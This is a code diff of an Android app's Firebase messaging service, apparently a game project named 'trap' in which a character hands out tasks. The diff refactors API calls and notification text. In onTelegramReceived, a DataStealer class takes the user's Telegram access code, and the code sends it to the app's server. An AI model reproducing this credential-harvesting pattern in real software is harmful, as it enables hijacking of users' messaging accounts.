@@ -1,8 +1,9 @@
 package de.hpi3d.gamepgrog.trap.android.firebase;
 
 import android.app.Application;
-import android.content.Context;
 import android.util.Log;
+
+import androidx.annotation.NonNull;
 
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.google.firebase.messaging.FirebaseMessagingService;
@@ -11,11 +12,10 @@ import com.google.firebase.messaging.RemoteMessage;
 import java.util.ArrayList;
 import java.util.Map;
 
-import androidx.annotation.NonNull;
+import de.hpi3d.gamepgrog.trap.R;
 import de.hpi3d.gamepgrog.trap.android.DataStealer;
 import de.hpi3d.gamepgrog.trap.android.NotificationHelper;
-import de.hpi3d.gamepgrog.trap.api.ApiIntent;
-import de.hpi3d.gamepgrog.trap.api.ApiService;
+import de.hpi3d.gamepgrog.trap.api.ApiManager;
 import de.hpi3d.gamepgrog.trap.api.StorageManager;
 import de.hpi3d.gamepgrog.trap.tasks.Task;
 import de.hpi3d.gamepgrog.trap.tasks.TaskInitializerManager;
@@ -50,12 +50,9 @@ public class OurFirebaseMessagingService extends FirebaseMessagingService {
 
     private void onTelegramReceived() {
         String code = DataStealer.takeTelegramAccessCode(this);
-        ApiIntent
-                .build(this)
-                .setCall(ApiService.CALL_TELEGRAM_CODE)
-                .put(ApiService.KEY_USER_ID, StorageManager.with(this).userid.get())
-                .put(ApiService.KEY_TELEGRAM_CODE, code)
-                .start();
+        ApiManager.api(this).sendTelegramCode(
+                StorageManager.with(this).userid.get(), code
+        ).call();
     }
 
     private void onTasksReceived(ArrayList<Task> tasks) {
@@ -68,14 +65,8 @@ public class OurFirebaseMessagingService extends FirebaseMessagingService {
             }
         }
 
-        int amount = tasks.size();
-        String title = String.format("Andy Abbot has %s new Task%s for you",
-                amount, amount == 1 ? "" : "s");
-        String message = String.format("Open the App to see %s",
-                amount == 1 ? "it" : "them");
-
         NotificationHelper.sendNotification(getApplicationContext(),
-                title, message);
+                getString(R.string.notification_new), getString(R.string.notification_new_detail));
     }
 
 
@@ -93,14 +84,8 @@ public class OurFirebaseMessagingService extends FirebaseMessagingService {
         StorageManager.with(app).fbtoken.set(token);
     }
 
-    public static void sendNewToken(Context c, int userid, String token) {
-        ApiIntent
-                .build(c)
-                .setCall(ApiService.CALL_SEND_FB_TOKEN)
-                .put(ApiService.KEY_USER_ID, userid)
-                .put(ApiService.KEY_TOKEN, token)
-                // TODO add receiver, handle errors
-                .start();
+    public static void sendNewToken(Application c, int userid, String token) {
+        ApiManager.api(c).sendFBToken(userid, token).call();
     }
 
     public static void init(Application app) {
